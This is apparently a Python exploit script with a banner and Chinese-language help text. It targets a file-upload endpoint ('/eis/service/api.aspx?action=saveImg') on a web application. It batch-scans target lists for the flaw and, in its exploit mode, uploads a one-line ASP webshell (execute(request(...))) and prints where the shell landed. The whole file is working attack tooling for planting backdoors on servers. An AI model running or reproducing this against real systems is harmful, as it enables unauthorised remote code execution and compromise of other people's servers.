import requests
import argparse

requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool


def main():
    banner = """
██╗      █████╗ ███╗   ██╗██╗     ██╗███╗   ██╗
██║     ██╔══██╗████╗  ██║██║     ██║████╗  ██║
██║     ███████║██╔██╗ ██║██║     ██║██╔██╗ ██║
██║     ██╔══██║██║╚██╗██║██║     ██║██║╚██╗██║
███████╗██║  ██║██║ ╚████║███████╗██║██║ ╚████║
╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝╚═╝  ╚═══╝

    """
    print(banner)
    parse = argparse.ArgumentParser(description="漏洞描述")
    parse.add_argument('-u', '--url', dest='url', type=str, help='请输入URL地址')
    parse.add_argument('-f', '--file', dest='file', type=str, help='请选择批量文件')
    parse.add_argument('-exp', '--exploit', dest='exp', type=str, help='参数1上传一键webshell')
    args = parse.parse_args()
    url = args.url
    file = args.file
    targets = []
    if url:
        if args.exp:
            getshell(args.url)
        else:
            check(args.url)

    elif (file):

        f = open(file, 'r')
        for i in f.readlines():
            i = i.strip()
            if 'http' in i:
                targets.append(i)
            else:
                i = f"http://{i}"
                targets.append(i)
    pool = Pool(30)
    pool.map(check, targets)


def check(target):
    url = f'{target}/eis/service/api.aspx?action=saveImg'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryxdgaqmqu'
    }

    data = """
------WebKitFormBoundaryxdgaqmqu
Content-Disposition: form-data; name="file"filename="test.jsp"
Content-Type: text/html

<% response.write("test")%>
------WebKitFormBoundaryxdgaqmqu--
    """
    try:
        response = requests.post(url=url, headers=headers, data=data, verify=False, timeout=5)
        if response.status_code == 200 and '/files/editor_img' in response.text:
            print(f'[*] {target} 存在漏洞')
        else:
            print(f'[-] {target}  不存在')
    except Exception as e:
        pass


def getshell(url):
    url = f'{url}/eis/service/api.aspx?action=saveImg'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryxdgaqmqu'
    }

    data = """
------WebKitFormBoundaryxdgaqmqu
Content-Disposition: form-data; name="file"filename="test.jsp"
Content-Type: text/html

<%execute(request(“3”))%>
------WebKitFormBoundaryxdgaqmqu--
        """
    response = requests.post(url=url, data=data, headers=headers, verify=False)
    print(response.text)
    if response.status_code == 200 and '/files/editor_img' in response.text:
        print(f'已经上传一键webshell 地址：{response.text}')


if __name__ == '__main__':
    main()
